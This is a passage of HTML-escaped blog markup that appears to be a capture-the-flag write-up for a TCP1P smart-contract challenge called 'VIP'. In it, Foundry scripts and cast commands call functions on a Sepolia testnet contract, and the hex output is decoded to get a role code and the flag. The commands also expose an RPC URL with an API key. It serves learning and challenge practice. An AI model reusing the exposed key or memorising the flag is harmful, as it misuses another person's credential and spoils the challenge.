&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callStealVIPCode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Run Script and Decode the hex to get the VIPCode.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;Solve.s.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Compiling...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†í]&lt;&#x2F;span&gt;&lt;span&gt; Compiling 15 files with 0.10.20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Solc 0.8.20 finished in 5.35s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Compiler&lt;&#x2F;span&gt;&lt;span&gt; run successful!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Script&lt;&#x2F;span&gt;&lt;span&gt; ran successfully.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Logs&lt;&#x2F;span&gt;&lt;span&gt; ==
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x2049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743aa
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Crypto.Util.number&lt;&#x2F;span&gt;&lt;span&gt; import long_to_bytes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; long_to_bytes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x2049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743aa&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; I may or may not get you a ticket, but I don&amp;#39;t understand much about how to decode this.\nIt&amp;#39;s some sort of their abiCoder policy. \nVIP-Ticket: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002f5443503150317374436c61737353656174202d2069732074686520564950205469636b6574207468657920736169640000000000000000000000000000000000\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; long_to_bytes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x5443503150317374436c61737353656174202d2069732074686520564950205469636b657420746865792073616964&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;TCP1P1stClassSeat - is the VIP Ticket they said&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we have got VIPCode lets call &lt;code&gt;Entrance(role)&lt;&#x2F;code&gt; with role as &lt;strong&gt;&lt;code&gt;TCP1P1stClassSeat&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; and call &lt;code&gt;getCall()&lt;&#x2F;code&gt; to get flag hex and decode it for the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The final script  :&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SolveVIP is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getHelp&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _help) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;help()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; console.logBytes(abi.decode(_help, (bytes)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callStealVIPCode&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _vipCode) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stealVIPCode()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; console.logBytes(abi.decode(_vipCode,(bytes)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callEntrance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string memory _role&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrance(string)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_role))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callGetFlag&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _flag) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;getFlag()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes&lt;&#x2F;span&gt;&lt;span&gt;(_flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; getHelp();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; callStealVIPCode();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callEntrance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TCP1P1stClassSeat&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callGetFlag&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;Solve.s.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Compiling...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†í]&lt;&#x2F;span&gt;&lt;span&gt; Compiling 15 files with 0.10.20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Solc 0.8.20 finished in 10.35s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Compiler&lt;&#x2F;span&gt;&lt;span&gt; run successful!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Script&lt;&#x2F;span&gt;&lt;span&gt; ran successfully.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Logs&lt;&#x2F;span&gt;&lt;span&gt; ==
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003854435031507b345f6231745f6f665f6630756e6472795f73336e645f346e645f616269436f6465725f77306e375f687572375f793334687d0000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Crypto.Util.number&lt;&#x2F;span&gt;&lt;span&gt; import long_to_bytes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; long_to_bytes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x54435031507b345f6231745f6f665f6630756e6472795f73336e645f346e645f616269436f6465725f77306e375f687572375f793334687d&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h}&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;quick-way-to-solve&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#quick-way-to-solve&quot; aria-label=&quot;Anchor link for: quick-way-to-solve&quot;&gt;Quick way to Solve&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;We can use &lt;code&gt;cast&lt;&#x2F;code&gt; cli tool to call the function from command line quickly.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;help()&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stealVIPCode()&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; cast send 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;getEntrance(string)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;TCP1P1stClassSeat&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;getFlag()&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And dont forget to decoding each output in the same way we did before to get the flag.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;latest&#x2F;internals&#x2F;layout_in_storage.html&quot; target=_blank&gt;Solidity Docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;noxx.substack.com&#x2F;p&#x2F;evm-deep-dives-the-path-to-shadowy-3ea&quot; target=_blank&gt;noxx.substack.com&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
